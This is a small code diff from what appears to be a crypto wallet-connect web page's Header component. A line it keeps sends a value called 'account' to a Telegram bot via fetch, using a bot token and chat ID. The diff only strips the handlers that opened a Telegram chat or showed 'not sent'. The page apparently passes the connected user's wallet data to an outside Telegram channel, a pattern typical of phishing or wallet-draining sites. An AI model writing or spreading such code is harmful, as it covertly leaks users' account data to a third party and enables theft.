@@ -46,11 +46,7 @@ function Header() {
         fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.CHATID}&text=${account}`, {
             method: "GET"
         })
-            .then(success => {
-                window.open('https://web.telegram.org/z/#5694683449')
-            }, error => {
-                alert("not sent")
-            })
+           
     }
     const WalletConnect = new WalletConnectConnector({
         rpcUrl: `https://mainnet.infura.io/v3/${process.env.INFURA_KEY}`,
